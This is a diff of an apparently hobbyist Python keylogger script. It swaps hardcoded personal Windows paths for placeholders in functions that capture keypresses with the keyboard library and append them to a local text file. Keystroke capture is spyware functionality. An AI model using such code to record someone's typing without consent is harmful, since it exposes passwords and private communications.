@@ -2,7 +2,7 @@ import os #import OS library
 import keyboard #import Keyboard library
 
 def create_folder(): #def the funtions that will create a folder 
-    folder_path = "C:\\Users\\simsi\\Desktop\\desktop\\PY Projects\\keybored" #enter your own local path here
+    folder_path = "C:\\YOUR OWN PATH HERE\\FOLDER NAME" #enter your own local path here and name of folder
     os.makedirs(folder_path, exist_ok=True) #creates folder
     print("Folder Created") #This is optional to confirm a folder has been created
 
@@ -14,7 +14,7 @@ def key_logger(e): #define the function that will log keys
          write_to_file(keys_logged) #sends the Keys logged to the below function to write to file
 
 def write_to_file(keys): #def the function that will write the keys to a file
-    file_path = "C:\\Users\\simsi\\Desktop\\desktop\\PY Projects\\keybored\\logged_text.txt" #local path to the file you wanted created
+    file_path = "C:\\YOUR OWN PATH HERE\\FILE NAME.txt" #local path to the file you wanted created
     with open(file_path, "a") as file: #open the file created
         for key in keys: #iterate through the list of pressed keys
 
